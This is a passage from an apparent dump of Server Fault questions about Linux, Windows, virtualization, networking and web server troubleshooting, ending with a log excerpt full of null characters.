<pre><code> br0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
    inet 192.168.1.10  netmask 255.255.255.0  broadcast 192.168.1.255
    inet6 fe80::b8ca:7bff:fe23:e847  prefixlen 64  scopeid 0x20&lt;link&gt;
    ether ba:ca:7b:23:e8:47  txqueuelen 1000  (Ethernet)
    RX packets 0  bytes 0 (0.0 B)
    RX errors 0  dropped 0  overruns 0  frame 0
    TX packets 4  bytes 300 (300.0 B)
    TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

 enp0s26u1u6: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
    inet 192.168.1.9  netmask 255.255.255.0  broadcast 192.168.1.255
    inet6 fe80::3be6:18f3:cdd7:d837  prefixlen 64  scopeid 0x20&lt;link&gt;
    ether a0:ce:c8:01:75:ef  txqueuelen 1000  (Ethernet)
    RX packets 25284  bytes 1737100 (1.6 MiB)
    RX errors 0  dropped 6860  overruns 0  frame 0
    TX packets 25208  bytes 29421441 (28.0 MiB)
    TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

  enp2s0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
    inet 192.168.1.6  netmask 255.255.255.0  broadcast 192.168.1.255
    inet6 fe80::ca2d:afad:d824:1205  prefixlen 64  scopeid 0x20&lt;link&gt;
    ether 90:2b:34:9a:bf:67  txqueuelen 1000  (Ethernet)
    RX packets 3375628  bytes 4511208522 (4.2 GiB)
    RX errors 0  dropped 3301  overruns 0  frame 0
    TX packets 1832807  bytes 847946426 (808.6 MiB)
    TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
    device interrupt 18  

  enp2s0:0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
    inet 192.168.1.10  netmask 255.255.255.0  broadcast 192.168.1.255
    ether 90:2b:34:9a:bf:67  txqueuelen 1000  (Ethernet)
    device interrupt 18 
</code></pre>
","<networking><linux-networking><kvm-virtualization><libvirt>","2017-03-10 13:49:41"
"837499","Hacked by ruined@india.com","<p>I was happily working on my Azure VM playpen last night via a remote desktop session. When I logged on this morning I was presented with the attached message:</p>

<p><a href=""https://i.sstatic.net/Y7tys.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/Y7tys.png"" alt=""hacked pic""></a></p>

<p>The VM contained nothing of value and the study app I was working on was committed to a remote repo. So while I can easily delete this VM and create another, I am interested in ideas as to how this may have happened. I guess it could just be brute force password attack. Anyone else seen the same on an Azure VM?</p>
","<windows><security><azure><hacking>","2017-03-10 14:51:56"
"908819","Normal Shutdown, Thank you for playing in SSH logs","<p>I found this logs in my auth.log</p>

<pre><code>Apr 21 03:36:10 mikigal sshd[18181]: Accepted password for mikigal from MY_HOME_IP_ADRESS port 51814 ssh2
Apr 21 03:36:10 mikigal sshd[18181]: pam_unix(sshd:session): session opened for user mikigal by (uid=0)
Apr 21 03:36:10 mikigal systemd-logind[682]: New session 11 of user mikigal.
Apr 21 03:36:11 mikigal sshd[18189]: Received disconnect from MY_HOME_IP_ADRESS port 51814:11: Normal Shutdown, Thank you for playing
Apr 21 03:36:11 mikigal sshd[18189]: Disconnected from MY_HOME_IP_ADRESS port 51814
Apr 21 03:36:11 mikigal sshd[18181]: pam_unix(sshd:session): session closed for user mikigal
Apr 21 03:36:11 mikigal systemd-logind[682]: Removed session 11.
</code></pre>

<p>These logs exist on random hour, always from my IP address. At hours of this logs my PC was turned off. I reinstalled sytem on my VPS yesterday, because i thought I have some malware on my server, but logs still exists.</p>

<p>last command output:</p>

<pre><code>mikigal  pts/1        MY_HOME_IP_ADRESS  Sat Apr 21 12:37   still logged in
mikigal  pts/1        MY_HOME_IP_ADRESS  Sat Apr 21 11:35 - 12:15  (00:39)
mikigal  pts/1        MY_HOME_IP_ADRESS  Sat Apr 21 04:20 - 04:22  (00:01)
mikigal  pts/1        MY_HOME_IP_ADRESS  Sat Apr 21 04:04 - 04:05  (00:00)
mikigal  pts/1        MY_HOME_IP_ADRESS  Sat Apr 21 04:04 - 04:04  (00:00)
mikigal  pts/0        MY_HOME_IP_ADRESS  Sat Apr 21 03:15 - 04:16  (01:01)
root     pts/0        MY_HOME_IP_ADRESS  Sat Apr 21 03:07 - 03:14  (00:06)
reboot   system boot  4.9.0-6-amd64    Sat Apr 21 03:07   still running
root     pts/0        MY_HOME_IP_ADRESS  Sat Apr 21 03:04 - down   (00:02)
reboot   system boot  4.9.0-3-amd64    Sat Apr 21 03:04 - 03:07  (00:03)

wtmp begins Sat Apr 21 03:04:01 2018
</code></pre>

<p>Login at 03:36:11 from auth.log does not exists in last output. There is no info about this login in fail2ban.log. I have Debian 9. System and packets are updated to the newest version.</p>

<p>Is this normal? I have install fail2ban, disabled root login, custom SSH/SFTP port.</p>
","<ssh><debian><security><logging><ftp>","2018-04-21 10:51:20"
"1028720","Mikrotik RouterOS - How to prevent all devices in a VLAN from initiating any connections outside of the VLAN?","<p>I'm using a RouterOS device as a router on a stick.</p>
<p>I'd like to isolate a certain VLAN from the outside world so that the VLAN cannot instantiate any connections to other VLANs or to the Internet (WAN).</p>
<p>I've set up the following firewall rule:</p>
<pre><code>/ip firewall filter
add chain=forward \
    action=reject reject-with=icmp-admin-prohibited \
    connection-state=!established,related,untracked \
    in-interface=vlan120
</code></pre>
<p>It works for <code>ping</code>:</p>
<pre><code>ping www.google.com
PING www.google.com (172.217.20.4) 56(84) bytes of data.
From _gateway (192.168.120.1) icmp_seq=1 Packet filtered
</code></pre>
<p>It works for <code>tcp</code>:</p>
<pre><code>telnet www.google.com 80
Trying 172.217.20.4...
Trying 2a00:1450:400d:805::2004...
telnet: Unable to connect to remote host: Cannot assign requested address
</code></pre>
<p>But it does not work for <code>udp</code>:</p>
<pre><code>nc -z -v -u time1.google.com 123
Connection to time1.google.com 123 port [udp/ntp] succeeded!
</code></pre>
<p>Any help appreciated!</p>
","<vlan><mikrotik><routeros>","2020-08-03 17:37:11"
"1028764","Host resources management - vSphere Client","<p>I'm using vSphere Client version 6.7, having 2 hosts in a cluster.
i want to know before i'm entering one host into maintenance mode, if the other host will be able to hold both servers resources.
yes i know, i could calculate it by using free/used space in CPU,Storage,Memory fields.
i want to know if there is a simulator or something like that that will show me what will be the situation after i will move all VMs to the other host.</p>
<p>Thanks!</p>
","<virtualization><virtual-machines><filesystems><vmware-vsphere><vmware-vcenter>","2020-08-04 04:38:56"
"908918","CHMOD file and directory permissions changing back","<p>I have a website and I am trying to link an image stored in a directory, however when I change the file permissions to 775 they change back to 644 and the image isn't displaying. It is showing a Error 403 Forbidden error</p>

<p>My .htaccess is</p>

<pre><code>RewriteEngine on
RewriteCond %{HTTPS} off
RewriteCond %{HTTP:X-Forwarded-Proto} !https
RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]

RewriteRule .*\.()$ - [F,NC]

RewriteCond %{HTTP_REFERER} !^http://coolio85.com/.*$      [NC]
RewriteCond %{HTTP_REFERER} !^http://example.com$      [NC]
RewriteCond %{HTTP_REFERER} !^http://www.example.com/.*$      [NC]

RewriteCond %{HTTP_REFERER} !^http://www.example.com$      [NC]
RewriteCond %{HTTP_REFERER} !^https://example.com/.*$      [NC]
RewriteCond %{HTTP_REFERER} !^https://example.com$      [NC]
RewriteCond %{HTTP_REFERER} !^https://www.example.com/.*$      [NC]
RewriteCond %{HTTP_REFERER} !^https://www.example.com$      [NC]
RewriteRule ^html/(.*)$ /$1 [L,NC,R]
RewriteRule .*\.(jpg|jpeg|gif|png|bmp)$ - [F,NC]
</code></pre>
","<permissions><.htaccess><file-permissions><chmod>","2018-04-22 19:47:02"
"837624","how can I hide my system folders?","<p>I want to hide my system folders when I access to ftp.however it doesnt, how can I fix it?</p>

<p><a href=""https://i.sstatic.net/meEhW.png"" rel=""nofollow noreferrer"">ftp</a></p>
","<vsftpd>","2017-03-11 06:20:11"
"1028789","avoid redundant writing of virus scan signatures in VMs on same disk","<p>I have two VMs on the same disk that each have clamav installed. Both regularly run updates for the same virus scan signatures
simultaneously which results in an unnecessary strain on the performance of the disk every time.
Since those are the same signatures that are downloaded, I want to reduce the redundancy in that case.</p>
<p>The initial idea was to let them share a virtual disk where those signatures are downloaded once,
so the VMs just read them from there. Therefore, only one VM needs a write access to the disk for downloading while the other has readonly access.</p>
<p>I attached the virtual disk to the first VM with:
<code>$ virsh attach-disk &lt;VM1&gt; &lt;virtDisk&gt; vdb --cache none</code></p>
<p>However, while trying to attach the same virtual disk to the second VM, after attaching it to the first successfully, with:
<code>$ virsh attach-disk &lt;VM2&gt; &lt;virtDisk&gt; vdb --cache none --mode readonly</code></p>
<p>the error
<code>unable to execute QEMU command 'device-add': Failed to get shared &quot;write&quot; lock</code>
occurred.
Is it just not possible that way or am I missing an option?</p>
<p>What would be the best way to share those signatures between VMs for that purpose?</p>
","<virtual-machines><qemu><clamav>","2020-08-04 09:23:25"
"909037","Error while connecting to remote host using Ansible","<p>Geting error while connecting to <strong>remote Mysql host using Ansible</strong>.</p>

<p>Playbook as below</p>

<pre><code>--- 
- name: ""Create database""
  login_host: host.xyz.com 
  login_password: ""{{ mysql_root_pass }}""
  login_port: ""{{ mysql_port }}""
  login_user: ""{{ mysql_root }}""
  mysql_db: ""db=\""{{ item }}\"" state=present""
</code></pre>

<p>When try to connect getting following error. </p>

<pre><code>""msg"": ""ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (2)\n""
</code></pre>
","<mysql><ansible><ansible-playbook><ansible-galaxy>","2018-04-23 15:20:01"
"837732","AWS find .cer and .key file","<p>I have <code>httpd</code> running on AWS EC2. I have requested SSL certificate and the web server is running fine on https.
Now, I want to attach the certificate with a WebRTC <a href=""https://easyrtc.com/docs/easyrtc_server_ssl.php"" rel=""nofollow noreferrer""><code>easyrtc</code></a> server which requires <code>.crt</code> and <code>.key</code> files and I have no clue where to find it.</p>

<p>I have searched in aws console Certificate Manager but couldn't find the files. But I guess since the webserver is running on https already, the file should be there in the file system. </p>

<p>I tried below <code>localhost.crt</code> file which is <code>/etc/pki/tls/certs/localhost.crt</code> and <code>localhost.key</code> and the server is running fine, but the browser is throwing the warning because of may be self-signed certificate.
<a href=""https://i.sstatic.net/XasNf.jpg"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/XasNf.jpg"" alt=""enter image description here""></a></p>

<p>Please help.
I do not have much knowledge about SSL certificates and installation.</p>
","<amazon-ec2><ssl><amazon-web-services><ssl-certificate><openssl>","2017-03-11 22:34:31"
"1028914","Why does a computer need a name server to operate on a modern network?","<p>I completed a quiz that contained a question about the <strong>4 things every computer must have configured to work on a modern network</strong>.</p>
<p>I read everything and saw only the assertion that name servers were required... yet everything that I also just learned certainly does not require a name server right? I've got my nonroutable space... and I can NAT out of there and to server on the internet without any name servers right??</p>
<p>Do you think that &quot;Modern&quot; was just a tricky word here and the question surely ought to mean  that no MODERN network would be useful without the 4 things configured?</p>
","<networking>","2020-08-05 04:13:14"
"837834","Ansible: imposible to connect to server SSH Error: Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password)","<p>I have set up some ansible roles to configure a php web server. I use vagrant to my working copy and it works perfectly. But when I want to connect to a remote server I get this error:</p>

<pre><code>fatal: [xxxxxxx] =&gt; SSH Error: Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).
    while connecting to xxxxxxxxxx:22
It is sometimes useful to re-run the command using -vvvv, which prints SSH debug output to help diagnose the issue.
</code></pre>

<p>I have the ssh key set on the server (Cent OS 7) so if I do:</p>

<pre><code>ssh -l root XX.XX.XXX.XX 
</code></pre>

<p>I log in without problems.</p>

<p>Any idea why its failing to log in to the server? Thanks</p>
","<centos><ssh><ansible><public-key>","2017-03-12 19:56:39"
"909218","Active Directory user ID Password","<p>I need to know the password of an User ID in Active directory without resetting it. Is this possible? If so how? </p>

<p>Resetting password is not an option because almost 900 servers have the current password saved in their application. Changing password will fail that application in all those servers.</p>
","<active-directory><password>","2018-04-24 15:50:16"
"909221","Set Virtualmin default website when entering by IP","<p>I installed Virtualmin in CentOS 7.4 and I have 1 VirtualServer configured to a domain, when I navigate with the server IP I want to target a custom website hosted in /var/www/html or wathever instead of the first vhost on the server.</p>

<p>My httpd.conf is default, only edited ServerName with my custom domain.
I need to setup my SSL to make some cURL calls with a custom Virtualmin API too.</p>
","<centos><httpd><virtualmin>","2018-04-24 15:55:01"
"837963","Crontab curl response time to text file","<p>I am trying to get the response time of a server so for example I am using below curl command I got of the internet</p>

<pre><code>curl -w ""@curl-format.txt"" -o /dev/null -s http://wordpress.$
</code></pre>

<p>The curl-format.txt looks like the following:</p>

<pre><code>n
        time_namelookup:  %{time_namelookup}n
           time_connect:  %{time_connect}n
        time_appconnect:  %{time_appconnect}n
       time_pretransfer:  %{time_pretransfer}n
          time_redirect:  %{time_redirect}n
     time_starttransfer:  %{time_starttransfer}n
                        ----------n
             time_total:  %{time_total}n
n
</code></pre>

<p>This command works fine when called through the command line. </p>

<p>However when I try to use it in crontab and output the times to a file called Restime.text it does not work.</p>

<p>Below is the crontab command I am using.</p>

<pre><code>* * * * * /usr/bin/curl -w ""@curl-format.txt"" -o /dev/null -s http://wordpress.$ &gt;&gt; /home/ubuntu/newApp/Restime.txt 
</code></pre>

<p>Any advice as to where I am going wrong ?</p>

<p>Kind Regards.</p>
","<cron><curl><response-time>","2017-03-13 13:08:15"
"909391","php post request curl HTTP ERROR 500","<p>here is my configuration : Apache2 working with php7.1.</p>

<p>I have an example PHP code for sending a sms message specific to JasminSMS :</p>

<pre><code>&lt;?php
// Sending simple message using PHP
// http://jasminsms.com

$baseurl = 'http://127.0.0.1:1401/send'

$params = '?username=foo'
$params.= '&amp;password=bar'
$params.= '&amp;to='.urlencode('+336222172')
$params.= '&amp;content='.urlencode('Hello world !')

$response = file_get_contents($baseurl.$params);
?&gt;
</code></pre>

<p>But it does not working and give me error 500.</p>

<p>I have two examples that works well:</p>

<pre><code>http://127.0.0.1:1401/send?username=foo&amp;password=bar&amp;to=06222172&amp;content=hello
</code></pre>

<p>and</p>

<pre><code>curl -d ""username=foo&amp;password=bar&amp;dlr=yes&amp;dlr-level=3&amp;to=xxxxxxxxxx&amp;from=InfoMessage&amp;dlr-url=http://exemple.com/dlr.php&amp;content=hello !"" http://127.0.0.1:1401/send
</code></pre>

<p>I need to turn them into php queries and found them next exemples :</p>

<pre><code>&lt;?php
$ch = curl_init(""http://127.0.0.1:1401/send"");
$fp = fopen(""username=foo&amp;password=bar&amp;dlr=yes&amp;dlr-level=3&amp;to=xxxxxxxxxx&amp;from=InfoMessage&amp;dlr-url=http://exemple.com/dlr.php&amp;content=hello !"", ""w"");

curl_setopt($ch, CURLOPT_FILE, $fp);
curl_setopt($ch, CURLOPT_HEADER, 0);

curl_exec($ch);
curl_close($ch);
fclose($fp);
?&gt;


&lt;?php
 $ch = curl_init('http://127.0.0.1:1401/send?username=foo&amp;password=bar&amp;to=xxxxxxxxxx&amp;content=hello !');
 curl_exec ($ch);
 curl_close ($ch);
?&gt;
</code></pre>

<p>that I found here :</p>

<p><a href=""https://www.askapache.com/php/sending-post-form-data-php-curl/"" rel=""nofollow noreferrer"">Sending POST form data with php CURL</a>, <a href=""https://www.teletopiasms.no/np/frontpage/gateway/api-http-examples-php"" rel=""nofollow noreferrer"">api-http-examples-php</a> and I tested all these examples without result, all show me 500 error.</p>

<p>Maybe it needs to configure .htaccess, my file permissions are 755 with www-data.</p>

<p>Thanks for any help.</p>
","<php><apache2><curl><500-error><sms-gateway>","2018-04-25 12:24:00"
"1029259","3.5"" SAS drives in server with 2.5"" bays","<p>We recently acquired a very cheap 2nd-hand server (HP ProLiant DL380 G7).</p>
<p>We have a number of 3.5&quot; SAS drives, however the server only has mount points for 2.5&quot; bays.</p>
<p>We would still like to leverage them, in the most cost effective way of getting these drives connected to the server.</p>
<p>We are a small operation, and don't mind if things are a bit messy, or if we potentially shorten the life of the drives by not having good mounting - this is a budget rig not used for any core production.</p>
<p>I'm looking at <a href=""https://www.startech.com/Cables/Drive/SAS/50cm-Internal-Serial-Attached-SCSI-Mini-SAS-Cable-SFF8087-to-4x-FF8482%7ESAS808782P50"" rel=""nofollow noreferrer"">this internal SAS cable form Startech</a>, to connect the drives to the server, and then just have them sitting in a pile or whatever.</p>
<p>Would this work, or are there a better options?</p>
<p><a href=""https://serverfault.com/questions/333786/how-to-implement-cheap-lff-3-5-sata-storage-on-a-hp-proliant-ml350-g6-with-2-5"">This question is very similar</a>, though a number of years old and I'm unsure what backplane and cages would be compatible, available, and cheap for this server ((HP ProLiant DL380 G7)).</p>
","<storage><sas><rackmount>","2020-08-07 14:28:44"
"1029289","php geoip not working on ubuntu 18.04","<p>I can't get the GeoIP PHP extension working on Ubuntu 18.04 with PHP 7.2</p>
<p>i have intalled it by the cli: <code>sudo apt-get install -y php7.2-geoip</code></p>
<p>Its enabled in system but not working:</p>
<pre><code>php7.2 -i | grep geoip
/etc/php/7.2/cli/conf.d/20-geoip.ini,
geoip
geoip support =&gt; enabled
geoip extension version =&gt; 1.1.1
geoip library version =&gt; 1006012
geoip.custom_directory =&gt; no value =&gt; no value
</code></pre>
<p>testing with the following php code:</p>
<pre><code>&lt;?php
echo $_SERVER['GEOIP_COUNTRY_CODE'];
</code></pre>
<p>but the GEOIP module is not working</p>
","<apache-2.2><nginx><php><ubuntu-18.04><vestacp>","2020-08-07 19:07:17"
"1029322","Are different license keys required to activate Windows Sever 2019 SAC and LTSB releases?","<p>I have an unused Windows license for Windows Sever 2019 and the latest SAC install media. Can I instead use this license key with LTSB media, or does that require a different license?</p>
","<windows>","2020-08-08 05:37:31"
"909528","honoring quotes in a remote ssh execution with SSH_ORIGINAL_COMMAND","<p>I'm trying to execute a remote script with spaces in parameters and ssh is messing with them.</p>

<p>I got this script in a machine</p>

<pre><code>#!/bin/bash

CONT=""1""
while test ""$#"" -gt 0
do
    echo ""P${CONT} [$1]""
    P=""$P P${CONT} [$1]""
    shift
    let ""CONT++""
done
echo ""DEBUG: `date` - SSH_ORIGINAL_COMMAND [$SSH_ORIGINAL_COMMAND]""
</code></pre>

<p>and produces this output:</p>

<pre><code>./test_ssh.sh a 'b c' d
P1 [a]
P2 [b c]
P3 [d]
DEBUG: dj abr 19 14:03:52 CEST 2018 - SSH_ORIGINAL_COMMAND []
</code></pre>

<p>from a remote machine I get this output:</p>

<pre><code>ssh root@olivera ""test_ssh.sh a 'b c' d""
P1 [a]
P2 ['b]
P3 [c']
P4 [d]
DEBUG: dj abr 19 14:05:04 CEST 2018 - SSH_ORIGINAL_COMMAND [test_ssh.sh a 'b c' d]
</code></pre>

<p>I've tried several combinations with double quotes and scapes whithout any success.</p>

<p>any hints?</p>
","<ssh>","2018-04-26 07:51:13"
"1029494","Postgresql prompts for configuring tzdata when installing during docker image building","<p>I am trying to build a docker image with postgresql with Ubuntu. When the image is being built during the postgresql installation apt prompts for the config data (e.g. time zone settings), but the terminal emulator does not send a keypress for the apt's prompt. How do I either suppress this prompts or send some default values?</p>
<p>Host OS: Windows 10</p>
<p>Dockerfile (meaning strings):</p>
<pre><code>FROM ubuntu:18.04
RUN apt-get update -y
RUN apt-get install -y  python3-pip python-dev build-essential postgresql-server-dev-10 postgresql
RUN pip3 install -r requirements.txt
</code></pre>
","<ubuntu><docker><postgresql>","2020-08-10 09:41:52"
"1029547","How do I recover Windows 10 with files recovered from a drive","<p>I had a drive failure about 2 months ago on my custom built PC with Windows 10 (probably professional version).  It was a Seagate drive and they sent the drive to recovery and sent back a USB slimdrive with all of the files recovered.</p>
<p>My question is:  How do I now recover back to Windows 10?</p>
<p>I was hoping I could copy those files onto a new drive and boot up Windows, but that results in &quot;No MBR Found&quot;.  I also tried booting from the USB slimdrive, but that results in a different message telling me to select a proper boot device.</p>
","<windows-10><data-recovery>","2020-08-10 15:48:39"
"960800","How to gather in a save, cheap and easy way high quality entropy on a Linux machine?","<p>When no radioactive decay is available and good entropy is strongly advised for security reasons you experience a real problem. HTTPS connections consume a lot of entropy. If you have thousands of them per hour between machines low on good entropy (like deprived Web Servers at 4 o'clock am), your HTTPS (wget) poisen's your entropy pool. 'You become a victim of a 12 year old script kid'.<br>
If I run Deezer (music) all the time, my entropy_available                ['cat /proc/sys/kernel/random/entropy_available' when 'poolsize' in the same directory is 4096 should be full! 4096.]  still went's down till I do some keystrokes. Then it jumps up more or some times less. I have no real good source of entropy here (only my selves - and even humans are deterministic). I am searching for a easy and cheap solution for 2 web crawler's 24 hrs online in a 'office' like setup. They ping each other and the router to distribute the (bad) entropy. I think of writing log's using a serial dot matrix printer to gather entropy mechanically (very noisy). The Sound Card Microphone is no good source of entropy. Short Wave Noise is as bad as a Microphone. The Bit rate is much higher on Short Wave. You can gather only 'White Noise' in this way. It's like playing the same 10 song's on Deezer's auto play for Years and Years. So Hardware without radioactive decay can't work on it's own. You need a thing to mix it with. This thing is GOOD entropy. Any experience with bad/poisened entropy on Linux?  </p>
","<https><linux-kernel><web-crawler><entropy-pool>","2019-03-31 01:44:39"
"909809","Need help to choose a desktop or server for the 50 clients in a local network?","<p>We are going to build a application for school labs. Each lab contains maximum 60 students and all the students has to be connected in a local network. Each student will get a Android tablet or a desktop to watch the videos which will be served from a Lab's Server.  </p>

<p>Here server has following tasks.</p>

<ol>
<li><p>It has to download videos from internet or cloud at some time in a day by manually or cron.</p></li>
<li><p>It has to a run an Apache/Nginx server to stream the downloaded videos to all the students connected. we are thinking to code in NOdejs or python.</p></li>
<li><p>It has to serve 50 to 60 clients for 2 hrs continuously in different batches. For example 4 different batch students(50 students) may come to the lab and listen to the videos. So server uptime will be 8 hrs per day with max 60 concurrent connections at a time.</p></li>
</ol>

<p>Now, we are in a situation that do we need a dedicated server for serving clients offline or a desktop with good processor and RAM is enough?</p>

<p>Please guide us in this usecase. Happy to give more details.Please comment.</p>
","<networking><video-streaming><offline-files><video-hosting><file-hosting>","2018-04-28 13:15:57"
"838631","Apache Active Workers and Hits per Second","<p>We are using 2 AppServer with an Idle Workload of 10 Apache Workers and and 5 Hits per Second.</p>

<p>These Servers got 12 CPUs and 8GB of RAM. Monitoring is accessed by Zabbix. My question about this is - are these Servers way to much for the traffic we gernerate? And equals max_connections (we have 500 set)with active workers?</p>

<p>We have the monitoring, but do not know what the max really is and the hoster will not answer us.</p>

<p>Thanks in advance.</p>
","<mysql><zabbix><gentoo>","2017-03-16 10:39:42"
"909841","what is the difference between amazon edge location and cloudfront?","<p>How Amazon edgelocation and cloudfront relate to each other?
I understand Both are used for reducing the latency and keep information (cache info)at the nearest location.</p>
","<amazon-web-services><amazon-cloudfront>","2018-04-28 22:20:32"
"960914","What causes these strange characters (@^@^@^@^) in /var/log/messages?","<p>One of my servers stops responding occasionally, today I checked the logs and I seen the attached entries. 
I assumed it uses too much memory and crashes, but seeing this log, I am not sure, what can cause that strange line (<code>@^@^@^@^</code>) right when server gets unresponsive ?</p>

<pre><code>Apr  1 00:57:01 b2 systemd: Starting Session 14039 of user root.
Apr  1 00:57:01 b2 systemd: Started Session 14038 of user root.
Apr  1 00:57:01 b2 systemd: Starting Session 14038 of user root.
Apr  1 00:58:01 b2 systemd: Started Session 14042 of user root.
Apr  1 00:58:01 b2 systemd: Starting Session 14042 of user root.
Apr  1 00:58:01 b2 systemd: Started Session 14040 of user root.
Apr  1 00:58:01 b2 systemd: Starting Session 14040 of user root.
Apr  1 00:58:01 b2 systemd: Started Session 14041 of user root.
Apr  1 00:58:01 b2 systemd: Starting Session 14041 of user root.
Apr  1 00:59:01 b2 systemd: Started Session 14043 of user root.
Apr  1 00:59:01 b2 systemd: Starting Session 14043 of user root.
Apr  1 00:59:01 b2 systemd: Started Session 14044 of user root.
Apr  1 00:59:01 b2 systemd: Starting Session 14044 of user root.
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^